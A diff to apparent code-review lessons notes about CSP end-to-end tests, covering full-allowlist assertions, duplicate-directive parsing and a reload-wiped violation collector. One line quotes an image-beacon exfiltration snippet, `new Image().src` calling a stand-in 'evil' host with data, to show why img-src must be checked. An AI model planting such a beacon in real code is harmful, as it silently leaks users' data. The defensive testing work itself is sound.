@@ -30,3 +30,16 @@ Running the institutionalized reviewer AGAIN, this time on the *post-fix* code (
 - **Exact-match the WHOLE allowlist, not a hand-picked subset.** The first fix exact-asserted `script-src`/`connect-src`/`worker-src`/`object-src`/`base-uri`/`frame-ancestors` but **omitted `img-src` and `form-action`** — the other exfil channels the threat model names. A partial application of "match exactly" leaves the identical green-loosening hole for the omitted members (`new Image().src='https://evil/?d='+data` is a fetch-free image-beacon exfil that `connect-src` does NOT cover). Fix: assert the **COMPLETE** policy as one directive→value table (deny-by-default — any added/removed/loosened/drifted directive reds), so coverage can never be silently partial.
 - **A directive-value parser must reject duplicates (the browser is first-occurrence-wins).** A duplicated directive: the browser enforces the FIRST occurrence; a last-wins (`Map.set`) parser reads the tight LAST copy while the browser enforces a loose FIRST copy → green while loosened. Fail loud on a duplicate.
 - **Meta:** a review that *generates* fixes leaves those fixes unreviewed — a second pass on the delta is where the first pass's own omissions surface. Three independent lenses (testing/security/adversary) converging on the same gap was the signal it was real (not a single reviewer's hunch).
+
+## Extended (2026-11-26, Act 6 RC19's review): a collector installed by `addInitScript` is wiped by every navigation, so a check after a reload hears only the new page
+
+`e2e/csp.spec.ts` collects violations in the page: an `addInitScript` sets `window.__cspViolations = []` and pushes
+each `securitypolicyviolation` into it, and `violations(page)` reads the array. An init script runs again on every
+document load, so a reload or a navigation starts a new empty array. RC19 added a `page.reload()` (the vault's
+save-then-unlock walk) before the CSP shell arm's only `violations()` check. Everything before the reload was never
+checked: the whole shell walk, every page and the Save drawer. The arm stayed green. The review caught it (b9-6);
+`6aa20fa6` checks the collector before each reload as well as at the end.
+
+**What it adds.** A gate that collects in the page is scoped to one document. Read it before every navigation the arm
+makes (a reload, a link, a `page.goto`), or move the collector out of the page. When an arm gains a reload, find every
+collector it relies on.
